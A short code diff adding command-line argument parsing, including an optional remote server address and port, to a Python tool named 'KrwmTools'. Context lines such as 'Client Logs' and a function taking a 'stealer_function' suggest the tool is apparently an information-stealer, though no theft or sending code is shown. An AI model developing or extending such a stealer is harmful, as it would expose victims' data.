@@ -2,6 +2,7 @@
 import os
 import json
 from shutil import copyfile
+from argparse import ArgumentParser
 
 """ CONSTANTS """
 # Directory paths
@@ -13,6 +14,16 @@ LOGS_PATH = KRWM_DIR + '/Client Logs'
 FORMAT = 'utf-8'
 # Number of bits in a byte
 BITS_IN_BYTE = 8
+
+
+def get_arguments():
+    """ Returns the command line arguments for the program """
+    parser = ArgumentParser(description='KrwmTools')
+    parser.add_argument('-r', '--remote', nargs='*', required=False, default=None,
+                        help='Setup a remote connection (optional server_address, server_port)',
+                        metavar='server_address (OPTIONAL) server_port (OPTIONAL)')
+    args = parser.parse_args()
+    return args
 
 
 def try_extract(stealer_function):
